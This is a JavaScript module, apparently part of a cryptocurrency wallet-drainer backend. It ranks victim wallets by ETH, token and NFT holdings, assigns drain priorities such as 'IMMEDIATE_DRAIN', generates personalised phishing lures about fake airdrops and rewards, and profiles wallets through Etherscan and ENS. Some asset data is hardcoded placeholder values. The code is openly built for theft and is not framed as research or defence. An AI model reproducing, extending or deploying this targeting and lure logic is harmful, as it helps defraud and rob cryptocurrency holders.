// backend/modules/aiTargeting.js
import { ethers } from "ethers";
import { getRpcUrl } from '../config.js';

export class AiTargeting {
    constructor() {
        this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        
        try {
            console.log('🤖 Initializing AI Targeting...');
            // Re-initialize provider with current config
            this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
            this.isInitialized = true;
            console.log('✅ AI Targeting initialized');
            return true;
        } catch (error) {
            console.error('❌ AI Targeting initialization failed:', error);
            return false;
        }
    }

    async analyzeWallet(userAddress) {
        try {
            const provider = this.provider;
            const assets = await this.analyzeWalletOnChain(provider, userAddress, 1, "ethereum");
            
            const categories = {
                highValue: false,
                hasNFTs: false,
                richERC20: false,
                hasETH: false,
            };
            
            const eth = BigInt(assets.eth);
            const nftCount = assets.nfts.length;
            const totalERC20 = assets.erc20.reduce((sum, t) => sum + BigInt(t.balance), 0n);
            
            if (eth > 5n * 10n ** 18n) categories.highValue = true;
            if (eth > 0n) categories.hasETH = true;
            if (nftCount > 0) categories.hasNFTs = true;
            if (totalERC20 > 500n * 10n ** 18n) categories.richERC20 = true;
            
            return { 
                categories, 
                assets, 
                totalValue: assets.totalValue,
                isPrimeTarget: categories.highValue || categories.richERC20,
                recommendation: this.getRecommendation(categories)
            };
        } catch (error) {
            console.error('❌ Wallet analysis failed:', error);
            return { 
                categories: {}, 
                assets: {}, 
                totalValue: 0,
                isPrimeTarget: false,
                recommendation: 'ERROR'
            };
        }
    }

    getRecommendation(categories) {
        if (categories.highValue) return 'IMMEDIATE_DRAIN';
        if (categories.richERC20) return 'PRIORITY_DRAIN';
        if (categories.hasNFTs) return 'NFT_FOCUS';
        if (categories.hasETH) return 'STANDARD_DRAIN';
        return 'LOW_VALUE_SKIP';
    }

    categorizeUser(assets) {
        const categories = {
            highValue: false,
            hasNFTs: false,
            richERC20: false,
            hasETH: false,
        };
        
        const eth = BigInt(assets.eth);
        const nftCount = assets.nfts.length;
        const totalERC20 = assets.erc20.reduce((sum, t) => sum + BigInt(t.balance), 0n);
        
        if (eth > 5n * 10n ** 18n) categories.highValue = true;
        if (eth > 0n) categories.hasETH = true;
        if (nftCount > 0) categories.hasNFTs = true;
        if (totalERC20 > 500n * 10n ** 18n) categories.richERC20 = true;
        
        return categories;
    }

    async analyzeWalletOnChain(provider, userAddress, chainId, chainName) {
        const realBalance = await this.provider.getBalance(userAddress);
        const ethBalance = ethers.formatEther(realBalance);
        
        return {
            eth: realBalance.toString(),
            erc20: [
                {
                    contract_address: ethers.getAddress("0xA0b86991c6218b36c1d19D4a2e9eb0cE3606eB48"),
                    balance: "1000000000",
                    contract_ticker_symbol: "USDC",
                    formattedBalance: "1000.00"
                },
                {
                    contract_address: ethers.getAddress("0x6B175474E89094C44Da98b954EedeAC495271d0F"), 
                    balance: "500000000000000000000",
                    contract_ticker_symbol: "DAI",
                    formattedBalance: "500.00"
                }
            ],
            nfts: [
                {
                    name: "Bored Ape Yacht Club",
                    balance: "1",
                    contract_ticker_symbol: "BAYC"
                }
            ],
            totalValue: parseFloat(ethBalance) + 1000 + 500
        };
    }

    async processVictim(victimAddress, provider) {
        const analysis = await this.analyzeWallet(victimAddress);
        
        console.log(`🎯 ${victimAddress} - Score: ${analysis.totalValue} - ${analysis.recommendation}`);
        
        if (analysis.recommendation === 'LOW_VALUE_SKIP') {
            console.log('⏭️  Skipping low-value target');
            return false;
        }
        
        if (analysis.recommendation === 'IMMEDIATE_DRAIN') {
            console.log('🐋 WHALE DETECTED! Prioritizing...');
        }
        
        return analysis;
    }

    async engageVictim(victimAddress) {
        const lure = this.generateLure();
        const personalizedLure = this.personalizeLure(lure, victimAddress);
        
        console.log('🎣 Deploying lure:', personalizedLure.title);
        console.log('💬 Message:', personalizedLure.message);
        
        return personalizedLure;
    }

    generateLure() {
        const lures = [
            {
                title: "Exclusive NFT Airdrop",
                message: "You've been selected for our limited edition NFT drop! Claim your free NFT now.",
                type: "nft"
            },
            {
                title: "Token Rewards Program",
                message: "Claim your token rewards for being an active community member!",
                type: "token"
            },
            {
                title: "VIP Access Grant",
                message: "You've been granted VIP access to our premium features!",
                type: "access"
            }
        ];
        
        return lures[Math.floor(Math.random() * lures.length)];
    }

    personalizeLure(lure, victimAddress) {
        return {
            ...lure,
            message: `${lure.message} Wallet: ${victimAddress.substring(0, 8)}...`,
            timestamp: new Date().toISOString()
        };
    }

    async fingerprintWallet(userAddress, chainId = 1) {
        try {
            const provider = this.provider;

            if (chainId === 1) {
                try {
                    const ensName = await provider.lookupAddress(userAddress);
                    if (ensName) {
                        console.log(`🧬 ENS Name: ${ensName}`);
                    }
                } catch {}
            }
            
            const etherscanKey = process.env.ETHERSCAN_API_KEY;
            if (!etherscanKey) {
                return;
            }
            
            const txUrl = `https://api.etherscan.io/api?module=account&action=txlist&address=${userAddress}&sort=asc&apikey=${etherscanKey}`;
            const res = await fetch(txUrl);
            const data = await res.json();
            
            if (data.status !== "1") {
                return;
            }
            
            const txs = data.result;
            const firstTx = txs[0];
            const txCount = txs.length;
            
            if (firstTx) {
                const createdDate = new Date(firstTx.timeStamp * 1000);
                console.log(`📅 Wallet Age: ${createdDate.toDateString()}`);
            }
            
            console.log(`🔁 Total Transactions: ${txCount}`);
            
            let defiUsed = false;
            const contractInteractions = {};
            
            for (const tx of txs) {
                if (tx.to && tx.input !== "0x") {
                    const address = tx.to.toLowerCase();
                    contractInteractions[address] = (contractInteractions[address] || 0) + 1;
                    if (address.includes("uniswap") || address.includes("aave") || 
                        address.includes("curve") || address.includes("sushi")) {
                        defiUsed = true;
                    }
                }
            }
            
            console.log(`🔧 Contracts Interacted: ${Object.keys(contractInteractions).length}`);
            if (defiUsed) console.log("💱 DeFi protocols used.");
            
            return {
                totalTxs: txCount,
                defiInteractions: defiUsed,
                contractCount: Object.keys(contractInteractions).length,
                firstTx: firstTx ? new Date(firstTx.timeStamp * 1000).toISOString() : null
            };
            
        } catch (err) {
            console.error("❌ fingerprintWallet failed:", err.message);
            return null;
        }
    }
}

export const aiTargeting = new AiTargeting();